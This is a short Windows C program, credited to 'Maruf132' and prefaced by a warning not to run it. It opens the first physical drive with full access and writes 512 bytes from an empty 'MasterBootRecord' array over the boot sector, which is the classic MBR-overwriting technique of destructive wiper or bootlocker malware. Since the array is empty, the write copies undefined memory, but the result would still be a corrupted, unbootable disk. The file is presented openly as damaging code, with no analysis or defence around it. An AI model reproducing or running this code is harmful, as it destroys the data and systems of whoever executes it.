// this is very dangerous do not run this on your host computer this may damage your computer seriously!
// this was written by Maruf132
#include <windows.h>

const unsigned char MasterBootRecord[] = {};
int CALLBACK WinMain(
    HINSTANCE hInstance, HINSTANCE hPrevInstance,
    LPSTR     lpCmdLine, int       nCmdShow
)
{
    DWORD dwBytesWritten;
    HANDLE hDevice = CreateFileW(
        L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
        FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
        OPEN_EXISTING, 0, 0);

    WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0);
    CloseHandle(hDevice);
}
